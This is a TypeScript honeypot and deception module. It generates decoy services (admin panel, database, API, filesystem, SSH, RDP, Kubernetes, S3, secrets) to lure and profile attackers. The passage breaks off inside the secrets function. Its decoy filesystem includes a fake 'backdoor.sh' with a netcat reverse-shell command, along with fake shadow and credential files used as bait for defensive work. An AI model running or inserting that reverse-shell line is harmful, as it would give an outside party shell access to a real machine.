/**
 * Honeypot + Deception module
 * Provides realistic honeypot services, honeytokens, deception strategies,
 * moving target defense, and attacker behavior tracking.
 * @module honeypot
 */

import { createHash, randomBytes } from 'crypto';
import { sha3_256 } from '@noble/hashes/sha3';
import { getLogger, getMetrics, createSpan, getEventBus, SecurityEvent, EventSeverity } from '../core/index.js';
import { SecurityError } from '../core/exceptions.js';
import pino from 'pino';
const logger = pino().child({ module: 'msf.honeypot' });

// ─── Type Definitions ───────────────────────────────────────────────────────

export interface HoneypotConfig {
  id: string;
  type: string;
  services: FakeService[];
  detectionRules: DetectionRule[];
  alertThreshold: number;
  createdAt: Date;
  updatedAt: Date;
}

export interface FakeService {
  id: string;
  type: string;
  port: number;
  host: string;
  status: 'running' | 'stopped' | 'degraded';
  config: Record<string, unknown>;
  metadata: Record<string, unknown>;
  startedAt: Date;
}

export interface DetectionRule {
  id: string;
  pattern: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  action: 'log' | 'alert' | 'block' | 'redirect';
}

export interface BehaviorProfile {
  sessionId: string;
  ip: string;
  actions: AttackerAction[];
  timeline: TimelineEntry[];
  riskScore: number;
  classification: string;
  techniques: string[];
  firstSeen: Date;
  lastSeen: Date;
}

export interface AttackerAction {
  type: string;
  target: string;
  payload?: string;
  timestamp: Date;
  result: string;
}

export interface TimelineEntry {
  time: Date;
  event: string;
  details: string;
}

export interface DeceptionStrategy {
  id: string;
  services: FakeService[];
  rotationSchedule: RotationEntry[];
  effectiveness: number;
  confidence: number;
  updatedAt: Date;
}

export interface RotationEntry {
  serviceId: string;
  nextRotation: Date;
  newConfig: Record<string, unknown>;
}

export interface MTDConfig {
  id: string;
  services: MTDService[];
  rotationIntervalMs: number;
  randomizationFactor: number;
  activePorts: number[];
  updatedAt: Date;
}

export interface MTDService {
  id: string;
  name: string;
  currentPort: number;
  originalPort: number;
  lastRotated: Date;
  nextRotation: Date;
}

export interface Honeytoken {
  id: string;
  type: string;
  value: string;
  hash: string;
  metadata: Record<string, unknown>;
  tracking: TrackingConfig;
  createdAt: Date;
  status: 'active' | 'triggered' | 'revoked';
}

export interface TrackingConfig {
  endpoint: string;
  alertEmail?: string;
  webhookUrl?: string;
  logLevel: 'info' | 'warn' | 'error';
}

export interface DetectionResult {
  detected: boolean;
  matches: CredentialMatch[];
  riskScore: number;
  timestamp: Date;
  recommendation: string;
}

export interface CredentialMatch {
  credential: string;
  source: string;
  matchedToken: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
}

export interface RouteConfig {
  routes: DeceptiveRoute[];
  detectionCallback: (req: unknown, res: unknown) => void;
  middleware: unknown[];
}

export interface DeceptiveRoute {
  path: string;
  method: string;
  handler: (req: unknown, res: unknown) => void;
  trap: boolean;
}

// ─── Utility Functions ──────────────────────────────────────────────────────

function generateId(prefix: string): string {
  return prefix + '-' + randomBytes(8).toString('hex');
}

function hashValue(value: string): string {
  return createHash('sha256').update(value).digest('hex');
}

function randomPort(min = 1024, max = 65535): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomIP(): string {
  return Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join('.');
}

function randomHex(length: number): string {
  return randomBytes(length).toString('hex');
}

function pickRandom<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function clamp(val: number, min: number, max: number): number {
  return Math.max(min, Math.min(max, val));
}

// ─── 1. adaptiveHoneypot ────────────────────────────────────────────────────

export interface AdaptiveHoneypotConfig {
  baseType?: string;
  serviceCount?: number;
  stealthMode?: boolean;
}

export interface TrafficAnalysis {
  sourceIPs: string[];
  requestRate: number;
  attackSignatures: string[];
  geoDistribution: Record<string, number>;
}

/**
 * @description Creates an adaptive honeypot configuration that adjusts based on
 * real-time traffic analysis and threat level. Dynamically scales service count,
 * stealth settings, and detection rules.
 * @param config - Base honeypot configuration options
 * @param trafficAnalysis - Current traffic pattern analysis
 * @param threatLevel - Numeric threat level (0-10)
 * @returns Adaptive HoneypotConfig with scaled services and rules
 * @example
 * const hp = await adaptiveHoneypot(
 *   { baseType: 'web', serviceCount: 3 },
 *   { sourceIPs: ['1.2.3.4'], requestRate: 150, attackSignatures: ['sql-injection'], geoDistribution: {} },
 *   7
 * );
 */
export async function adaptiveHoneypot(
  config: AdaptiveHoneypotConfig = {},
  trafficAnalysis: TrafficAnalysis,
  threatLevel: number,
): Promise<HoneypotConfig> {
  const span = createSpan('honeypot.adaptiveHoneypot');
  const metrics = getMetrics();
  const eventBus = getEventBus();

  try {
    const normalizedThreat = clamp(threatLevel, 0, 10);
    const serviceCount = Math.max(1, config.serviceCount ?? Math.ceil(normalizedThreat * 1.5));
    const stealthMode = config.stealthMode ?? normalizedThreat > 5;

    const services: FakeService[] = [];
    const baseType = config.baseType ?? 'web';

    for (let i = 0; i < serviceCount; i++) {
      services.push({
        id: generateId('svc'),
        type: baseType,
        port: randomPort(),
        host: randomIP(),
        status: 'running',
        config: {
          stealth: stealthMode,
          responseDelay: normalizedThreat > 7 ? Math.random() * 500 : 0,
          logAll: true,
        },
        metadata: { threatLevel: normalizedThreat, index: i },
        startedAt: new Date(),
      });
    }

    const detectionRules: DetectionRule[] = trafficAnalysis.attackSignatures.map((sig) => ({
      id: generateId('rule'),
      pattern: sig,
      severity: normalizedThreat > 7 ? 'critical' : normalizedThreat > 4 ? 'high' : 'medium',
      action: normalizedThreat > 7 ? 'block' : 'alert',
    }));

    const honeypotConfig: HoneypotConfig = {
      id: generateId('hp'),
      type: baseType,
      services,
      detectionRules,
      alertThreshold: Math.max(1, 10 - normalizedThreat),
      createdAt: new Date(),
      updatedAt: new Date(),
    };

    metrics.incCounter('honeypot.adaptive.created');
    eventBus.publish('honeypot:adaptive', {
      severity: EventSeverity.MEDIUM,
      data: { configId: honeypotConfig.id, threatLevel: normalizedThreat, serviceCount },
    } as SecurityEvent);

    logger.info({ configId: honeypotConfig.id, threatLevel: normalizedThreat, serviceCount }, 'Adaptive honeypot created');
    span.end();
    return honeypotConfig;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.adaptive.error');
    logger.error(err, 'Failed to create adaptive honeypot');
    throw new SecurityError('ADAPTIVE_HONEYPOT_FAILED', 'Failed to create adaptive honeypot configuration');
  }
}

// ─── 2. fakeAdminPanel ──────────────────────────────────────────────────────

export interface FakeAdminPanelTemplate {
  framework?: string;
  theme?: string;
  title?: string;
}

export interface FakeAdminRoute {
  path: string;
  method?: string;
  response?: Record<string, unknown>;
}

/**
 * @description Creates a fake admin panel service with realistic routes,
 * authentication flows, and administrative endpoints to attract and track attackers.
 * @param template - Visual template configuration for the panel
 * @param routes - Custom route definitions
 * @param responses - Default response payloads for routes
 * @returns FakeService representing the admin panel
 * @example
 * const panel = await fakeAdminPanel(
 *   { framework: 'react', theme: 'dark', title: 'Admin Console' },
 *   [{ path: '/admin/users', method: 'GET' }],
 *   { '/admin/users': { users: [] } }
 * );
 */
export async function fakeAdminPanel(
  template: FakeAdminPanelTemplate = {},
  routes: FakeAdminRoute[] = [],
  responses: Record<string, Record<string, unknown>> = {},
): Promise<FakeService> {
  const span = createSpan('honeypot.fakeAdminPanel');
  const metrics = getMetrics();

  try {
    const framework = template.framework ?? 'react';
    const theme = template.theme ?? 'light';
    const title = template.title ?? 'Administration Panel';

    const defaultRoutes = [
      { path: '/admin/login', method: 'POST', response: { token: 'fake-jwt-' + randomHex(32) } },
      { path: '/admin/dashboard', method: 'GET', response: { stats: { users: 1247, sessions: 89 } } },
      { path: '/admin/users', method: 'GET', response: { users: [{ id: 1, role: 'admin' }] } },
      { path: '/admin/settings', method: 'GET', response: { config: { maintenance: false } } },
      { path: '/admin/logs', method: 'GET', response: { logs: [] } },
      { path: '/admin/api-keys', method: 'GET', response: { keys: [{ id: 'key-1', name: 'Production' }] } },
    ];

    const mergedRoutes = [...defaultRoutes, ...routes];
    const mergedResponses = { ...responses };

    const service: FakeService = {
      id: generateId('admin'),
      type: 'fake-admin-panel',
      port: randomPort(8000, 9000),
      host: '0.0.0.0',
      status: 'running',
      config: {
        framework,
        theme,
        title,
        routes: mergedRoutes,
        responses: mergedResponses,
        csrfProtection: true,
        sessionTimeout: 3600,
      },
      metadata: {
        template,
        routeCount: mergedRoutes.length,
        createdWith: 'fakeAdminPanel',
      },
      startedAt: new Date(),
    };

    metrics.incCounter('honeypot.fakeAdminPanel.created');
    logger.info({ serviceId: service.id, framework, routeCount: mergedRoutes.length }, 'Fake admin panel created');
    span.end();
    return service;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.fakeAdminPanel.error');
    logger.error(err, 'Failed to create fake admin panel');
    throw new SecurityError('FAKE_ADMIN_PANEL_FAILED', 'Failed to create fake admin panel');
  }
}

// ─── 3. fakeDatabase ────────────────────────────────────────────────────────

export interface FakeDatabaseSchema {
  tables?: string[];
  engine?: string;
  version?: string;
}

export interface FakeDatabaseRecord {
  table: string;
  data: Record<string, unknown>[];
}

/**
 * @description Creates a fake database service with realistic schema, sample records,
 * and connection string to lure attackers attempting database enumeration or injection.
 * @param schema - Database schema definition
 * @param records - Sample data records to populate tables
 * @param connectionString - Fake connection string for the database
 * @returns FakeService representing the fake database
 * @example
 * const db = await fakeDatabase(
 *   { tables: ['users', 'sessions'], engine: 'postgres', version: '15.2' },
 *   [{ table: 'users', data: [{ id: 1, name: 'admin' }] }],
 *   'postgresql://admin:pass@db.internal:5432/production'
 * );
 */
export async function fakeDatabase(
  schema: FakeDatabaseSchema = {},
  records: FakeDatabaseRecord[] = [],
  connectionString: string = '',
): Promise<FakeService> {
  const span = createSpan('honeypot.fakeDatabase');
  const metrics = getMetrics();

  try {
    const engine = schema.engine ?? 'postgresql';
    const version = schema.version ?? '15.2';
    const tables = schema.tables ?? ['users', 'sessions', 'config', 'logs'];
    const connStr = connectionString || `${engine}://admin:${randomHex(12)}@db-${randomHex(4)}.internal:${engine === 'postgresql' ? 5432 : 3306}/production`;

    const defaultRecords: FakeDatabaseRecord[] = tables.map((table) => ({
      table,
      data: table === 'users'
        ? [
            { id: 1, username: 'admin', email: 'admin@company.com', role: 'superadmin', created_at: '2024-01-15' },
            { id: 2, username: 'dbadmin', email: 'dba@company.com', role: 'dba', created_at: '2024-02-20' },
            { id: 3, username: 'service_account', email: 'svc@internal', role: 'service', created_at: '2024-03-01' },
          ]
        : table === 'sessions'
          ? [
              { id: 1, user_id: 1, token: 'sess_' + randomHex(32), expires_at: '2026-12-31' },
              { id: 2, user_id: 2, token: 'sess_' + randomHex(32), expires_at: '2026-11-30' },
            ]
          : table === 'config'
            ? [{ key: 'db.version', value: version, updated_at: '2024-01-01' }]
            : [{ id: 1, level: 'info', message: 'Database initialized', timestamp: '2024-01-01T00:00:00Z' }],
    }));

    const mergedRecords = [...defaultRecords, ...records];

    const service: FakeService = {
      id: generateId('db'),
      type: 'fake-database',
      port: engine === 'postgresql' ? 5432 : engine === 'mysql' ? 3306 : 27017,
      host: '0.0.0.0',
      status: 'running',
      config: {
        engine,
        version,
        tables: tables.map((t) => ({ name: t, recordCount: mergedRecords.find((r) => r.table === t)?.data.length ?? 0 })),
        connectionString: connStr,
        maxConnections: 100,
        ssl: true,
      },
      metadata: {
        schema,
        recordCount: mergedRecords.reduce((sum, r) => sum + r.data.length, 0),
        records: mergedRecords,
      },
      startedAt: new Date(),
    };

    metrics.incCounter('honeypot.fakeDatabase.created');
    logger.info({ serviceId: service.id, engine, tableCount: tables.length }, 'Fake database created');
    span.end();
    return service;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.fakeDatabase.error');
    logger.error(err, 'Failed to create fake database');
    throw new SecurityError('FAKE_DATABASE_FAILED', 'Failed to create fake database');
  }
}

// ─── 4. fakeApi ─────────────────────────────────────────────────────────────

export interface FakeApiEndpoint {
  path: string;
  method: string;
  auth?: string;
}

export interface FakeApiResponse {
  status?: number;
  body: Record<string, unknown>;
  headers?: Record<string, string>;
}

export interface FakeApiRateLimit {
  requestsPerMinute?: number;
  burstLimit?: number;
}

/**
 * @description Creates a fake API service with configurable endpoints, response
 * payloads, and rate limiting to simulate a real production API.
 * @param endpoints - API endpoint definitions
 * @param responses - Response payloads keyed by endpoint path
 * @param rateLimit - Rate limiting configuration
 * @returns FakeService representing the fake API
 * @example
 * const api = await fakeApi(
 *   [{ path: '/api/v1/users', method: 'GET', auth: 'bearer' }],
 *   { '/api/v1/users': { status: 200, body: { users: [] } } },
 *   { requestsPerMinute: 60 }
 * );
 */
export async function fakeApi(
  endpoints: FakeApiEndpoint[],
  responses: Record<string, FakeApiResponse> = {},
  rateLimit: FakeApiRateLimit = {},
): Promise<FakeService> {
  const span = createSpan('honeypot.fakeApi');
  const metrics = getMetrics();

  try {
    const defaultEndpoints: FakeApiEndpoint[] = [
      { path: '/api/v1/health', method: 'GET' },
      { path: '/api/v1/users', method: 'GET', auth: 'bearer' },
      { path: '/api/v1/users/:id', method: 'GET', auth: 'bearer' },
      { path: '/api/v1/auth/login', method: 'POST' },
      { path: '/api/v1/auth/token', method: 'POST' },
      { path: '/api/v1/config', method: 'GET', auth: 'bearer' },
      { path: '/api/v1/admin/secrets', method: 'GET', auth: 'bearer' },
    ];

    const defaultResponses: Record<string, FakeApiResponse> = {
      '/api/v1/health': { status: 200, body: { status: 'ok', version: '2.1.0', uptime: 86400 } },
      '/api/v1/users': { status: 200, body: { users: [{ id: 1, name: 'Admin User', email: 'admin@example.com' }], total: 1 } },
      '/api/v1/auth/login': { status: 200, body: { token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.' + randomHex(48), expires_in: 3600 } },
      '/api/v1/config': { status: 200, body: { api_version: 'v1', rate_limit: 1000, features: ['auth', 'logging'] } },
      '/api/v1/admin/secrets': { status: 200, body: { secrets: [{ name: 'API_KEY', value: 'sk-' + randomHex(24) }] } },
    };

    const mergedEndpoints = [...defaultEndpoints, ...endpoints];
    const mergedResponses = { ...defaultResponses, ...responses };

    const service: FakeService = {
      id: generateId('api'),
      type: 'fake-api',
      port: randomPort(3000, 4000),
      host: '0.0.0.0',
      status: 'running',
      config: {
        endpoints: mergedEndpoints,
        responses: mergedResponses,
        rateLimit: {
          requestsPerMinute: rateLimit.requestsPerMinute ?? 100,
          burstLimit: rateLimit.burstLimit ?? 20,
        },
        cors: { origin: '*', methods: ['GET', 'POST', 'PUT', 'DELETE'] },
        versioning: 'url',
      },
      metadata: {
        endpointCount: mergedEndpoints.length,
        authEndpoints: mergedEndpoints.filter((e) => e.auth).length,
      },
      startedAt: new Date(),
    };

    metrics.incCounter('honeypot.fakeApi.created');
    logger.info({ serviceId: service.id, endpointCount: mergedEndpoints.length }, 'Fake API created');
    span.end();
    return service;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.fakeApi.error');
    logger.error(err, 'Failed to create fake API');
    throw new SecurityError('FAKE_API_FAILED', 'Failed to create fake API');
  }
}

// ─── 5. fakeFilesystem ──────────────────────────────────────────────────────

export interface FakeFileNode {
  name: string;
  type: 'file' | 'directory';
  size?: number;
  content?: string;
  children?: FakeFileNode[];
}

export interface FakeFileEntry {
  path: string;
  content: string;
  permissions?: string;
}

export interface FakeFilePermissions {
  default?: string;
  overrides?: Record<string, string>;
}

/**
 * @description Creates a fake filesystem service with realistic directory structure,
 * file contents, and permissions to attract attackers probing for sensitive files.
 * @param structure - Root directory tree structure
 * @param files - Individual file entries with paths and contents
 * @param permissions - File permission configuration
 * @returns FakeService representing the fake filesystem
 * @example
 * const fs = await fakeFilesystem(
 *   { name: 'root', type: 'directory', children: [] },
 *   [{ path: '/etc/passwd', content: 'root:x:0:0:root:/root:/bin/bash' }],
 *   { default: '644', overrides: { '/etc/shadow': '000' } }
 * );
 */
export async function fakeFilesystem(
  structure: FakeFileNode = { name: 'root', type: 'directory', children: [] },
  files: FakeFileEntry[] = [],
  permissions: FakeFilePermissions = {},
): Promise<FakeService> {
  const span = createSpan('honeypot.fakeFilesystem');
  const metrics = getMetrics();

  try {
    const defaultFiles: FakeFileEntry[] = [
      { path: '/etc/passwd', content: 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\napp:x:1000:1000:Application:/home/app:/bin/bash', permissions: '644' },
      { path: '/etc/shadow', content: 'root:$6$rounds=656000$' + randomHex(16) + '$' + randomHex(43) + ':19000:0:99999:7:::', permissions: '000' },
      { path: '/etc/hosts', content: '127.0.0.1 localhost\n10.0.0.5 db-primary.internal\n10.0.0.6 db-replica.internal', permissions: '644' },
      { path: '/var/log/auth.log', content: `[${new Date().toISOString()}] sshd[1234]: Accepted publickey for admin from 10.0.0.1\n[${new Date().toISOString()}] sudo: admin : TTY=pts/0 ; COMMAND=/bin/systemctl restart nginx`, permissions: '640' },
      { path: '/home/app/.env', content: 'DATABASE_URL=postgresql://app:secret@db:5432/production\nREDIS_URL=redis://cache:6379\nJWT_SECRET=' + randomHex(32), permissions: '600' },
      { path: '/opt/app/config.yml', content: 'server:\n  port: 8080\n  host: 0.0.0.0\ndatabase:\n  host: db.internal\n  port: 5432', permissions: '644' },
      { path: '/tmp/.hidden/backdoor.sh', content: '#!/bin/bash\nnc -e /bin/bash 10.0.0.99 4444', permissions: '755' },
    ];

    const mergedFiles = [...defaultFiles, ...files];
    const defaultPerms = permissions.default ?? '644';
    const overrides = permissions.overrides ?? {};

    const fileTree: FakeFileNode = {
      name: 'root',
      type: 'directory',
      children: mergedFiles.map((f) => ({
        name: f.path.split('/').pop() ?? 'unknown',
        type: 'file' as const,
        size: f.content.length,
        content: f.content,
      })),
    };

    const service: FakeService = {
      id: generateId('fs'),
      type: 'fake-filesystem',
      port: 0,
      host: 'localhost',
      status: 'running',
      config: {
        root: structure.name === 'root' ? fileTree : structure,
        files: mergedFiles.map((f) => ({
          path: f.path,
          size: f.content.length,
          permissions: overrides[f.path] ?? f.permissions ?? defaultPerms,
        })),
        defaultPermissions: defaultPerms,
        permissionOverrides: overrides,
      },
      metadata: {
        fileCount: mergedFiles.length,
        structure,
        totalSize: mergedFiles.reduce((sum, f) => sum + f.content.length, 0),
      },
      startedAt: new Date(),
    };

    metrics.incCounter('honeypot.fakeFilesystem.created');
    logger.info({ serviceId: service.id, fileCount: mergedFiles.length }, 'Fake filesystem created');
    span.end();
    return service;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.fakeFilesystem.error');
    logger.error(err, 'Failed to create fake filesystem');
    throw new SecurityError('FAKE_FILESYSTEM_FAILED', 'Failed to create fake filesystem');
  }
}

// ─── 6. fakeSshService ──────────────────────────────────────────────────────

/**
 * @description Creates a fake SSH service that simulates an SSH server with
 * realistic banners, host keys, and authentication flows to capture brute-force attempts.
 * @param banner - SSH server banner string
 * @param hostKey - Fake SSH host key (generated if not provided)
 * @param port - Port to listen on
 * @returns FakeService representing the fake SSH server
 * @example
 * const ssh = await fakeSshService(
 *   'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6',
 *   undefined,
 *   22
 * );
 */
export async function fakeSshService(
  banner: string = 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6',
  hostKey: string = '',
  port: number = 22,
): Promise<FakeService> {
  const span = createSpan('honeypot.fakeSshService');
  const metrics = getMetrics();

  try {
    const key = hostKey || 'ssh-rsa ' + randomBytes(256).toString('base64');
    const keyFingerprint = createHash('sha256').update(key).digest('hex');

    const service: FakeService = {
      id: generateId('ssh'),
      type: 'fake-ssh',
      port,
      host: '0.0.0.0',
      status: 'running',
      config: {
        banner,
        hostKey: key,
        hostKeyFingerprint: 'SHA256:' + keyFingerprint,
        authMethods: ['password', 'publickey', 'keyboard-interactive'],
        maxAuthTries: 6,
        loginGraceTime: 120,
        protocol: 'SSH-2.0',
        keyExchangeAlgorithms: ['curve25519-sha256', 'diffie-hellman-group16-sha512'],
        ciphers: ['aes256-gcm@openssh.com', 'chacha20-poly1305@openssh.com'],
      },
      metadata: {
        banner,
        acceptedCredentials: [] as Array<{ username: string; password: string; timestamp: Date }>,
        connectionAttempts: 0,
      },
      startedAt: new Date(),
    };

    metrics.incCounter('honeypot.fakeSshService.created');
    logger.info({ serviceId: service.id, port, banner }, 'Fake SSH service created');
    span.end();
    return service;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.fakeSshService.error');
    logger.error(err, 'Failed to create fake SSH service');
    throw new SecurityError('FAKE_SSH_FAILED', 'Failed to create fake SSH service');
  }
}

// ─── 7. fakeRdpService ──────────────────────────────────────────────────────

export interface FakeRdpAuthentication {
  nla?: boolean;
  tls?: boolean;
  allowedUsers?: string[];
}

/**
 * @description Creates a fake RDP service simulating a Windows Remote Desktop
 * server to capture credential stuffing and RDP brute-force attacks.
 * @param banner - RDP server banner
 * @param port - Port to listen on (default 3389)
 * @param authentication - Authentication configuration
 * @returns FakeService representing the fake RDP server
 * @example
 * const rdp = await fakeRdpService(
 *   'Windows Server 2022 RDP',
 *   3389,
 *   { nla: true, tls: true }
 * );
 */
export async function fakeRdpService(
  banner: string = 'Windows Server 2022 RDP',
  port: number = 3389,
  authentication: FakeRdpAuthentication = {},
): Promise<FakeService> {
  const span = createSpan('honeypot.fakeRdpService');
  const metrics = getMetrics();

  try {
    const service: FakeService = {
      id: generateId('rdp'),
      type: 'fake-rdp',
      port,
      host: '0.0.0.0',
      status: 'running',
      config: {
        banner,
        protocol: 'RDP',
        securityLayer: authentication.nla ? 'NLA' : authentication.tls ? 'TLS' : 'RDP',
        encryptionLevel: 'high',
        maxConnections: 2,
        sessionTimeout: 3600,
        authentication: {
          nla: authentication.nla ?? true,
          tls: authentication.tls ?? true,
          allowedUsers: authentication.allowedUsers ?? ['Administrator', 'admin', 'rdpuser'],
        },
        clipboard: false,
        driveRedirection: false,
      },
      metadata: {
        banner,
        connectionAttempts: 0,
        capturedCredentials: [] as Array<{ username: string; domain: string; timestamp: Date }>,
      },
      startedAt: new Date(),
    };

    metrics.incCounter('honeypot.fakeRdpService.created');
    logger.info({ serviceId: service.id, port, securityLayer: service.config.securityLayer }, 'Fake RDP service created');
    span.end();
    return service;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.fakeRdpService.error');
    logger.error(err, 'Failed to create fake RDP service');
    throw new SecurityError('FAKE_RDP_FAILED', 'Failed to create fake RDP service');
  }
}

// ─── 8. fakeKubernetesCluster ───────────────────────────────────────────────

export interface FakeK8sApiServer {
  url?: string;
  version?: string;
  authMode?: string;
}

export interface FakeK8sNode {
  name: string;
  role?: string;
  capacity?: Record<string, string>;
}

export interface FakeK8sNamespace {
  name: string;
  labels?: Record<string, string>;
}

/**
 * @description Creates a fake Kubernetes cluster simulation with API server,
 * worker nodes, and namespaces to attract attackers targeting container orchestration.
 * @param apiServer - API server configuration
 * @param nodes - Worker node definitions
 * @param namespaces - Namespace definitions
 * @returns FakeService representing the fake K8s cluster
 * @example
 * const k8s = await fakeKubernetesCluster(
 *   { url: 'https://k8s-api.internal:6443', version: '1.28.0' },
 *   [{ name: 'worker-1', role: 'worker' }],
 *   [{ name: 'default' }, { name: 'kube-system' }]
 * );
 */
export async function fakeKubernetesCluster(
  apiServer: FakeK8sApiServer = {},
  nodes: FakeK8sNode[] = [],
  namespaces: FakeK8sNamespace[] = [],
): Promise<FakeService> {
  const span = createSpan('honeypot.fakeKubernetesCluster');
  const metrics = getMetrics();

  try {
    const defaultNodes: FakeK8sNode[] = [
      { name: 'control-plane', role: 'control-plane', capacity: { cpu: '4', memory: '8Gi' } },
      { name: 'worker-1', role: 'worker', capacity: { cpu: '8', memory: '32Gi' } },
      { name: 'worker-2', role: 'worker', capacity: { cpu: '8', memory: '32Gi' } },
    ];

    const defaultNamespaces: FakeK8sNamespace[] = [
      { name: 'default', labels: { 'kubernetes.io/metadata.name': 'default' } },
      { name: 'kube-system', labels: { 'kubernetes.io/metadata.name': 'kube-system' } },
      { name: 'kube-public', labels: { 'kubernetes.io/metadata.name': 'kube-public' } },
      { name: 'monitoring', labels: { env: 'production' } },
      { name: 'app', labels: { env: 'production', team: 'backend' } },
    ];

    const mergedNodes = [...defaultNodes, ...nodes];
    const mergedNamespaces = [...defaultNamespaces, ...namespaces];

    const service: FakeService = {
      id: generateId('k8s'),
      type: 'fake-kubernetes',
      port: apiServer.url ? parseInt(apiServer.url.split(':').pop() ?? '6443') : 6443,
      host: '0.0.0.0',
      status: 'running',
      config: {
        apiServer: {
          url: apiServer.url ?? 'https://k8s-api.internal:6443',
          version: apiServer.version ?? '1.28.0',
          authMode: apiServer.authMode ?? 'Token',
        },
        nodes: mergedNodes,
        namespaces: mergedNamespaces,
        clusterName: 'production-cluster',
        networkPlugin: 'calico',
        containerRuntime: 'containerd',
      },
      metadata: {
        nodeCount: mergedNodes.length,
        namespaceCount: mergedNamespaces.length,
        pods: mergedNamespaces.map((ns) => ({
          namespace: ns.name,
          count: Math.floor(Math.random() * 10) + 1,
        })),
      },
      startedAt: new Date(),
    };

    metrics.incCounter('honeypot.fakeKubernetesCluster.created');
    logger.info({ serviceId: service.id, nodeCount: mergedNodes.length }, 'Fake Kubernetes cluster created');
    span.end();
    return service;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.fakeKubernetesCluster.error');
    logger.error(err, 'Failed to create fake Kubernetes cluster');
    throw new SecurityError('FAKE_K8S_FAILED', 'Failed to create fake Kubernetes cluster');
  }
}

// ─── 9. fakeS3Bucket ────────────────────────────────────────────────────────

export interface FakeS3Object {
  key: string;
  size: number;
  contentType?: string;
  lastModified?: string;
  etag?: string;
}

export interface FakeS3Permissions {
  public?: boolean;
  read?: string[];
  write?: string[];
}

/**
 * @description Creates a fake S3 bucket service with realistic objects and
 * permissions to capture attackers probing for exposed cloud storage.
 * @param bucketName - Name of the fake bucket
 * @param objects - List of fake objects in the bucket
 * @param permissions - Access permission configuration
 * @returns FakeService representing the fake S3 bucket
 * @example
 * const s3 = await fakeS3Bucket(
 *   'company-production-backups',
 *   [{ key: 'db-backup-2024.sql.gz', size: 1048576 }],
 *   { public: false, read: ['arn:aws:iam::123:role/backup'] }
 * );
 */
export async function fakeS3Bucket(
  bucketName: string = 'production-data-' + randomHex(8),
  objects: FakeS3Object[] = [],
  permissions: FakeS3Permissions = {},
): Promise<FakeService> {
  const span = createSpan('honeypot.fakeS3Bucket');
  const metrics = getMetrics();

  try {
    const defaultObjects: FakeS3Object[] = [
      { key: 'backups/db-dump-2024-01-15.sql.gz', size: 52428800, contentType: 'application/gzip', lastModified: '2024-01-15T03:00:00Z', etag: '"' + randomHex(16) + '"' },
      { key: 'backups/db-dump-2024-02-15.sql.gz', size: 55428800, contentType: 'application/gzip', lastModified: '2024-02-15T03:00:00Z', etag: '"' + randomHex(16) + '"' },
      { key: 'config/app-settings.json', size: 2048, contentType: 'application/json', lastModified: '2024-03-01T12:00:00Z', etag: '"' + randomHex(16) + '"' },
      { key: 'logs/access-2024-01.log', size: 10485760, contentType: 'text/plain', lastModified: '2024-01-31T23:59:59Z', etag: '"' + randomHex(16) + '"' },
      { key: 'secrets/.env.production', size: 512, contentType: 'text/plain', lastModified: '2024-01-01T00:00:00Z', etag: '"' + randomHex(16) + '"' },
      { key: 'certs/wildcard.example.com.pem', size: 4096, contentType: 'application/x-pem-file', lastModified: '2024-06-01T00:00:00Z', etag: '"' + randomHex(16) + '"' },
    ];

    const mergedObjects = [...defaultObjects, ...objects];

    const service: FakeService = {
      id: generateId('s3'),
      type: 'fake-s3-bucket',
      port: 443,
      host: bucketName + '.s3.amazonaws.com',
      status: 'running',
      config: {
        bucketName,
        region: 'us-east-1',
        objects: mergedObjects,
        permissions: {
          public: permissions.public ?? false,
          read: permissions.read ?? [],
          write: permissions.write ?? [],
          policy: {
            Version: '2012-10-17',
            Statement: [
              {
                Effect: permissions.public ? 'Allow' : 'Deny',
                Principal: permissions.public ? '*' : { AWS: permissions.read ?? [] },
                Action: 's3:GetObject',
                Resource: 'arn:aws:s3:::' + bucketName + '/*',
              },
            ],
          },
        },
        versioning: true,
        encryption: 'AES256',
      },
      metadata: {
        objectCount: mergedObjects.length,
        totalSize: mergedObjects.reduce((sum, o) => sum + o.size, 0),
        bucketName,
      },
      startedAt: new Date(),
    };

    metrics.incCounter('honeypot.fakeS3Bucket.created');
    logger.info({ serviceId: service.id, bucketName, objectCount: mergedObjects.length }, 'Fake S3 bucket created');
    span.end();
    return service;
  } catch (err) {
    span.end(err);
    metrics.incCounter('honeypot.fakeS3Bucket.error');
    logger.error(err, 'Failed to create fake S3 bucket');
    throw new SecurityError('FAKE_S3_FAILED', 'Failed to create fake S3 bucket');
  }
}

// ─── 10. fakeSecrets ────────────────────────────────────────────────────────

export interface FakeSecretEntry {
  name: string;
  value: string;
  type?: string;
}

export interface FakeSecretRotationPolicy {
  intervalMs?: number;
  autoRotate?: boolean;
  notifyOnRotate?: boolean;
}

/**
 * @description Creates fake secrets (API keys, tokens, credentials) with
 * realistic formats and optional rotation policies to detect secret exfiltration.
 * @param secretsList - List of fake secret entries
 * @param rotationPolicy - Secret rotation configuration
 * @returns FakeService containing the fake secrets
 * @example
 * const secrets = await fakeSecrets(
 *   [{ name: 'AWS_ACCESS_KEY', value: 'AKIAIOSFODNN7EXAMPLE', type: 'aws_key' }],
 *   { intervalMs: 86400000, autoRotate: true }
 * );
 */
export async function fakeSecrets(
  secretsList: FakeSecretEntry[],
  rotationPolicy: FakeSecretRotationPolicy = {},
): Promise<FakeService> {
  const span = createSpan('honeypot.fakeSecrets');
  const metrics = getMetrics();

  try {
    const defaultSecrets: FakeSecretEntry[] = [
      { name: 'AWS_ACCESS_KEY_ID', value: 'AKIA' + randomHex(16), type: 'aws_access_key' },
